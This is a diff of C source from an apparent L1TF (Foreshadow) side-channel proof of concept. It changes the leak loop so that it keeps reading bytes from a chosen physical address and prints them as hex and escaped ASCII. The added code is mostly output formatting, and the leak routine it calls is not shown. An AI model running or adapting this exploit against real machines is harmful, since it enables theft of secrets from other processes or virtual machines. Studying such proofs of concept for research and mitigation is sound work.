@@ -114,6 +114,70 @@ void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
   assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
 }
 
+void escape_ascii(char in, char out[3]) {
+  switch (in) {
+  case 0:
+  case 1:
+  case 2:
+  case 3:
+  case 4:
+  case 5:
+  case 6:
+  case 14:
+  case 15:
+  case 16:
+  case 17:
+  case 18:
+  case 19:
+  case 20:
+  case 21:
+  case 22:
+  case 23:
+  case 24:
+  case 25:
+  case 26:
+  case 27:
+  case 28:
+  case 29:
+  case 30:
+  case 31:
+  case 127:
+    out[0] = ' ';
+    break;
+  case 7:
+    out[0] = '\\';
+    out[1] = 'a';
+    break;
+  case 8:
+    out[0] = '\\';
+    out[1] = 'b';
+    break;
+  case 9:
+    out[0] = '\\';
+    out[1] = 't';
+    break;
+  case 10:
+    out[0] = '\\';
+    out[1] = 'n';
+    break;
+  case 11:
+    out[0] = '\\';
+    out[1] = 'v';
+    break;
+  case 12:
+    out[0] = '\\';
+    out[1] = 'f';
+    break;
+  case 13:
+    out[0] = '\\';
+    out[1] = 'r';
+    break;
+  default:
+    out[0] = in;
+    break;
+  }
+}
+
 void do_leak(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
@@ -134,24 +198,38 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   uint8_t *results = malloc(results_size);
   memset(results, 0, results_size);
 
-  printf("Results physcial addr %lx:\n", phys_addr);
+  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length,
+         phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
   while (1) {
+    bool new_data = false;
     for (size_t j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
       uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
 
       if (leaked_byte != 0) {
+        new_data = true;
         results[j - start] = leaked_byte;
       }
     }
 
-    for (size_t i = 0; i < length; ++i) {
-      printf("%02x ", results[i]);
+    if (new_data) {
+      printf("Hex: ");
+      for (size_t i = 0; i < length; ++i) {
+        printf("%02x", results[i]);
+      }
+      printf("\nASCII: ");
+      for (size_t i = 0; i < length; ++i) {
+        char x = results[i];
+        char out[3] = {0};
+        escape_ascii(x, out);
+        printf("%s", out);
+      }
+      printf("\n");
+      memset(results, 0, results_size);
     }
-    printf("\r");
   }
 
   free(results);
